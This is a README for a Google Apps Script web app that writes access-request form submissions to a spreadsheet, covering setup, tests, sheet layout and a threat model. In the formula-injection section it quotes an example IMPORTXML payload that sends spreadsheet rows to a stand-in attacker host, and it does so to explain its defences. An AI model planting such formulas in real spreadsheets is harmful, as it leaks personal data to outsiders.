# Request form → Google Sheets

The backend for the "Cere Accesul În Lojă" form. A Google Apps Script web app
receives each request and appends one row to the **primeA** tab of a
spreadsheet.

```
index.html  ──POST JSON──▶  Apps Script web app  ──▶  Spreadsheet
(assets/js/app.js)              Code.gs                  "primeA" tab
```

| File | What it does |
| --- | --- |
| `Code.gs` | The whole endpoint, in five sections: limits and keys · tokens · input validation · the sheet · the two web-app routes. |
| `appsscript.json` | Manifest — pins the runtime, the single OAuth scope and the web-app access. |
| `test/` | Runs `Code.gs` under Node against stubbed Google services. |

One file, because Apps Script concatenates every `.gs` in a project into a
single global scope anyway — splitting it buys nothing at runtime and costs a
second thing to keep in sync.

## Setup

1. **Create the spreadsheet.** Nothing to set up inside it: the script looks for
   a tab named `primeA` and creates it, first in the tab order, if it is not
   there. The header row is written on the first run. The tab name lives in
   `SHEET_NAME` at the top of section 4 — if you change it there, rename the tab
   in the spreadsheet to match, because the script finds it by name and the two
   have to agree. Start with an empty tab: `ensureHeader_` only writes the
   header row when the tab has no rows yet.

2. **Open the bound editor** from that spreadsheet: **Extensions ▸ Apps Script**.
   Bound, not standalone: it is what keeps the OAuth scope down to
   `spreadsheets.currentonly`, so the script can reach this one file and nothing
   else in your Drive.

3. **Paste `Code.gs`** over the empty `Code.gs` the editor starts with. Then
   **Project Settings ▸ Show "appsscript.json"**, and paste the manifest over
   the default.

4. **Run `setup()` once** from the editor (pick it in the function dropdown ▸
   Run). It generates the signing key, writes the header row, and gets the
   OAuth consent screen out of the way — the consent prompt must happen here,
   not on a visitor's first submit. Google will warn that the app is unverified;
   that is expected for a script you own, choose **Advanced ▸ Go to …**.

5. **Deploy ▸ New deployment ▸ Web app**
   - Execute as: **Me**
   - Who has access: **Anyone**

   Both are required. "Anyone" is what lets a visitor who is not signed in to
   Google reach the form; "Execute as: Me" is what lets that anonymous request
   write to a spreadsheet only you can open. The visitor never touches your
   Drive — this script does, on their behalf, through the two routes in
   `Code.gs`. There is no read route, so the endpoint cannot be used to pull
   the list back out.

6. **Copy the `/exec` URL** into `assets/js/app.js`:

   ```js
   var ENDPOINT = 'https://script.google.com/macros/s/AKfy…/exec';
   ```

   Left empty, the form falls back to its local demo behaviour and stores
   nothing — which is also the fastest way to check whether a problem is in
   the page or in the backend.

7. **Run `selfTest()`** once from the editor. It fires four formula-injection
   payloads at the validator, then writes one dummy row. Open the sheet, confirm
   the row is there, and delete it.

Re-deploying after an edit: **Deploy ▸ Manage deployments ▸ ✎ ▸ Version: New**.
Editing the code alone changes nothing at the live URL — a very easy hour to
lose. The URL itself is stable across new versions of the same deployment.

## Tests

```sh
node apps-script/test/test.js      # 69 checks, no dependencies
```

`test/harness.js` loads `Code.gs` into a VM context with stubbed
`PropertiesService`, `CacheService`, `LockService`, `Utilities` and
`SpreadsheetApp`, so the real code runs unmodified. The sheet stub throws if a
value reaches a cell in a form Sheets would evaluate, which is what makes the
injection cases meaningful rather than decorative. Everything below in "What is
actually defended" has a test.

## The sheet

The `primeA` tab, one row per request — four columns:

`Received At · Full Name · Signature · Email`

`Received At` is stamped from the server clock at the moment the submit is
processed and written pre-formatted as `dd.MM.yyyy HH:mm` (e.g. `09.09.2026
16:15`), always `Europe/Bucharest` regardless of the spreadsheet's own timezone.
It is stored as literal text — the plain string, not a timestamp. Do **not** add
an `ARRAYFORMULA` helper column to reformat it: a whole-column formula pushes
`getLastRow()` down and new rows then land far below the data instead of on the
next free row.

`Signature` is the visitor's typed consent gesture; in practice it repeats the
full name.

The script only ever appends, it never rewrites an existing row, so nothing you
add to the sheet can be clobbered by a submit — e.g. a `Status` column in
column E is safe, the script writes A–D and never touches it. The duplicate
check reads the `Email` column (**column 4**) once per submit.

The script writes and reads by **column position**, not header text: keep these
four columns in this order. Adding, removing or reordering one of them silently
sends new rows to the wrong fields (a fifth column further right is fine).
Sorting rows is fine. Other tabs in the file are never touched, and the tab is
found by name, so reordering the tabs cannot redirect submissions.

## What is actually defended, and what isn't

Everything the page checks, the server checks again from the raw request body.
The page's copy of the rules exists to save a visitor a round trip on a typo.

**Formula injection into the sheet** — the one that matters here. A field like
`=IMPORTXML("https://attacker.example/?d="&A2,"//x")` is a live formula the
moment it lands in a cell, and it will happily send every row above it to
whoever typed it. Two things stop it: every user value is written with a leading
apostrophe (Sheets' literal-text marker — stored, not displayed, and
`getValue()` returns the original), and the name fields reject anything that
isn't a letter, a space, or name punctuation. `setValues()` on an explicit range
rather than `appendRow()`, which re-parses its arguments as if typed.

**Replay and drive-by posting.** Apps Script cannot read request headers, so
there is no Origin check to make and a classic CSRF token has nothing to bind
to. Instead a submit must carry a token issued by a prior `GET`, HMAC-signed,
valid between 1.2 seconds and 30 minutes old, and burned on first use. It stops
replayed requests and naive automation. It is not authentication.

**Flooding.** One global rate limit — `RATE_MAX` submits (default 300) in any
rolling `RATE_WINDOW_MS` (default 1 hour) across the whole endpoint. Apps Script
has no client IP, so this is not per-visitor; it is a ceiling that keeps one bad
hour from spending the day's execution quota and taking the form down for
everyone. Normal traffic (~1000/day, well under 300 in any hour for this form)
never reaches it; past it, submits get `busy` until the window rolls forward.
The window is counted from real timestamps held in the cache, not a fixed clock
bucket. Tune the two constants at the top of section 2.

The token still does its share on top: a submit needs a `GET` first, the token
cannot be spent for 1.2 s, and it is burned on use. A determined attacker
rotating fake addresses can still push rows in under the rate ceiling, so
**treat every row as unverified until a human confirms it.** If bot rows become
a real problem, the next step is a CAPTCHA (Cloudflare Turnstile) verified
inside `doPost`; it is not wired up here.

**Enumeration — a deliberate trade.** A repeat address is rejected with
`error: 'duplicate'` so the visitor is told they have already applied. The cost:
anyone can type an address into the form and learn from the response whether it
is on the list. For an invitation-only list that is a real disclosure. It is
slowed by the token (one probe per ~1.5 s) but not closed. To close it, drop the
`emailExists_` check in `writeRow` and go back to answering every submit with
success.

**Bots.** The hidden `company` field is checked server-side as well as in the
page; a filled one gets a success response and no row.

**Leaks.** Responses are a fixed shape carrying a short code — never a message
built from user input, never an exception. Failures land in the Apps Script
console (Executions), where only you can read them.

Not defended, and worth being clear about: the endpoint is public by design.
Anyone who reads `app.js` has the URL and can post a plausible-looking request
that passes every check, up to the rate ceiling. **Treat every row as unverified
until a human confirms it.**

## Data protection

The sheet holds names and email addresses given under the consent line in the
form, which points at a privacy policy and terms — both are `href="#"` in
`index.html` today and need real pages before this collects anything from real
people. Access to the spreadsheet is access to the whole membership list: keep
the share list short, and prefer "Restricted" over "anyone with the link".
